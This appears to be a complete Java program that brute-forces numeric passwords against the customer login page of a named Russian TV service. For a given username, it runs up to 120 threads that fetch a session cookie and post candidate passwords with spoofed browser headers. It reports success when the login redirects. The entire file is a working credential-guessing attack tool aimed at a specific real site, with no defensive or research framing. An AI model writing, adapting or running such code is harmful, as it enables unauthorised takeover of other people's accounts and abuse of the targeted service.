package com.starplex.tvingo;

import org.apache.http.Consts;
import org.apache.http.HttpHeaders;
import org.apache.http.NameValuePair;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.util.*;

public class Main {

    private static final int THREADS_MAX = 120;
    private static final String BRUTE_URL_STRING = "https://cabinet.tvingo.ru/index.php";
    private static final int TIMEOUT = 15000;
    static RequestConfig defaultConfig = RequestConfig.custom()
            .setSocketTimeout(TIMEOUT)
            .setConnectTimeout(TIMEOUT)
            .setConnectionRequestTimeout(TIMEOUT)
            .build();

    static String login;

    static Set<Thread> threads = Collections.synchronizedSet(new TreeSet<>());

    static class MyThread extends Thread implements Comparable<MyThread> {
        private int pass;
        private int cnt;

        public MyThread(int pass, int cnt) {
            this.pass = pass;
            this.cnt = cnt;
        }

        @Override
        public void run() {
            try {
                CloseableHttpClient httpclient = HttpClients.createDefault();
                HttpGet get = new HttpGet("https://cabinet.tvingo.ru");

                CloseableHttpResponse response = httpclient.execute(get);
                String cookie = null;
                try {
                    cookie = response.getLastHeader("Set-Cookie").getElements()[0].getValue();
                } finally {
                    response.close();
                }

                HttpPost post = new HttpPost(BRUTE_URL_STRING);
                post.addHeader("Cookie", "PHPSESSID=" + cookie);
                post.addHeader("Host", "cabinet.tvingo.ru");
                post.addHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0");
                post.addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                post.addHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
                post.addHeader("Accept-Encoding", "gzip, deflate, br");
                post.addHeader("Content-Type", "application/x-www-form-urlencoded");
                post.addHeader("Referer", "https://cabinet.tvingo.ru/index.php");
                post.addHeader("Upgrade-Insecure-Requests", "1");
                post.addHeader("Connection", "keep-alive");
                post.addHeader(HttpHeaders.CONTENT_TYPE, "application/x-www-form-urlencoded");

                List<NameValuePair> params = new ArrayList<NameValuePair>();
                params.add(new BasicNameValuePair("username", login));
                params.add(new BasicNameValuePair("passwd", String.valueOf(pass)));
                params.add(new BasicNameValuePair("B1", "Вход"));

                UrlEncodedFormEntity entity = new UrlEncodedFormEntity(params, Consts.UTF_8);
                post.setEntity(entity);

                post.setConfig(defaultConfig);

                try (CloseableHttpResponse postResponse = httpclient.execute(post)) {
                    if (postResponse.getFirstHeader("Location") != null) {
                        System.out.print("Logged in ");
                        System.out.println(pass);
                        System.exit(0);
                    } else if (cnt % 1000 == 0) {
                        System.out.println(pass);
                    }
                }

            } catch (IOException e) {
                System.out.print("Exception in pass ");
                System.out.println(pass);
                //e.printStackTrace();
            }


            threads.remove(this);
        }

        @Override
        public int compareTo(MyThread o) {
            return Integer.compare(pass, o.pass);
        }
    }

    private static boolean check(int pass) {
        while (pass > 9) {
            if (pass % 10 == pass / 10 % 10)
                return false;

            pass /= 10;
        }

        return true;
    }

    public static void main(String[] args) {
        login = args[0];
        int pass = Integer.parseInt(args[1]);
        int cnt = 0;
        while (pass <= Integer.parseInt(args[2])) {
            if (threads.size() < THREADS_MAX) {
                if (check(pass)) {
                    Thread t = new MyThread(pass, cnt);
                    threads.add(t);
                    t.start();
                }
                pass++;
                cnt++;
            } else {
                try {
                    Thread.sleep(5);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
